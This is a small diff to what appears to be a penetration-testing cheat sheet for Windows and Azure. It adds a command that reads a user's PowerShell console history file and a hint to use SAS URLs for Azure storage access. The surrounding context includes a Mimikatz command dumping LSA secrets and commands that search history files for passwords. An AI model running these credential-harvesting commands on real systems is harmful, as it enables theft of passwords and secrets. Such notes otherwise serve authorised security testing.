@@ -279,6 +279,8 @@ Invoke-Mimikatz -Command '"token::elevate" "lsadump::secrets"'
 Get-Childitem -Path C:\Users\ -Force -Include ConsoleHost_history -Recurse -ErrorAction SilentlyContinue
 cat <FILE> | select-string password
 cat <FILE> | select-string secure
+
+cat %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt 
 ```
 
 ### Transcript
@@ -368,6 +370,8 @@ Get-AzStorageContainer -Context (Get-AzStorageAccount -Name <NAME> -ResourceGrou
 ```
 
 #### Check using the "Storage Explorer" application! Might be possible then!
+
+Use SAS URL
 
 #### Check if you can access storage account keys
 ```
